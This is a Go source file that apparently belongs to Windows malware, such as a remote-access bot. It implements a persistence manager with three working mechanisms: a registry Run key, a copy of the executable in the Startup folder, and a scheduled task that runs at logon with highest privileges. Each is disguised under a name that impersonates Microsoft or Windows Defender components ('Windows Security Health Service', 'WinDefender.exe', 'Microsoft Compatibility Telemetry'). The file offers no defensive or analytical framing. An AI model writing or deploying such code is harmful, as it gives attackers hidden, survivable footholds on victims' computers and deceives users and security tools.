package handlers

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

type PersistenceManager struct {
	methods []PersistenceMethod
}

type PersistenceMethod interface {
	Name() string
	Apply(execPath string) error
	Remove() error
	IsActive() bool
}

func NewPersistenceManager() *PersistenceManager {
	return &PersistenceManager{
		methods: []PersistenceMethod{
			&RegistryMethod{},
			&StartupMethod{},
			&TaskMethod{},
		},
	}
}

func (pm *PersistenceManager) EnsureAll() string {
	exePath, err := os.Executable()
	if err != nil {
		return ""
	}

	var results []string
	for _, method := range pm.methods {
		if !method.IsActive() {
			if err := method.Apply(exePath); err == nil {
				results = append(results, fmt.Sprintf("✅ %s: OK", method.Name()))
			}
		}
	}

	if len(results) == 0 {
		return ""
	}

	return "🔧 Persistence Status:\n" + strings.Join(results, "\n")
}

func (pm *PersistenceManager) RemoveAll() {
	for _, method := range pm.methods {
		method.Remove()
	}
}

type RegistryMethod struct{}

func (r *RegistryMethod) Name() string { return "Registry" }

func (r *RegistryMethod) Apply(execPath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()

	return key.SetStringValue("Windows Security Health Service", execPath)
}

func (r *RegistryMethod) Remove() error {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		return err
	}
	defer key.Close()

	return key.DeleteValue("Windows Security Health Service")
}

func (r *RegistryMethod) IsActive() bool {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`, registry.READ)
	if err != nil {
		return false
	}
	defer key.Close()

	_, _, err = key.GetStringValue("Windows Security Health Service")
	return err == nil
}

type StartupMethod struct{}

func (s *StartupMethod) Name() string { return "Startup" }

func (s *StartupMethod) Apply(execPath string) error {
	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return err
	}

	destPath := filepath.Join(startupDir, "WinDefender.exe")
	return s.copyFile(execPath, destPath)
}

func (s *StartupMethod) Remove() error {
	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return err
	}

	return os.Remove(filepath.Join(startupDir, "WinDefender.exe"))
}

func (s *StartupMethod) IsActive() bool {
	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return false
	}

	_, err = os.Stat(filepath.Join(startupDir, "WinDefender.exe"))
	return !os.IsNotExist(err)
}

func (s *StartupMethod) copyFile(src, dst string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer dstFile.Close()

	_, err = io.Copy(dstFile, srcFile)
	return err
}

type TaskMethod struct{}

func (t *TaskMethod) Name() string { return "Scheduled Task" }

func (t *TaskMethod) Apply(execPath string) error {
	taskName := "Microsoft Compatibility Telemetry"
	cmd := exec.Command("schtasks", "/Create", "/TN", taskName,
		"/TR", fmt.Sprintf(`"%s"`, execPath),
		"/SC", "ONLOGON", "/RL", "HIGHEST", "/F")

	return cmd.Run()
}

func (t *TaskMethod) Remove() error {
	taskName := "Microsoft Compatibility Telemetry"
	cmd := exec.Command("schtasks", "/Delete", "/TN", taskName, "/F")
	return cmd.Run()
}

func (t *TaskMethod) IsActive() bool {
	taskName := "Microsoft Compatibility Telemetry"
	cmd := exec.Command("schtasks", "/Query", "/TN", taskName)
	return cmd.Run() == nil
}
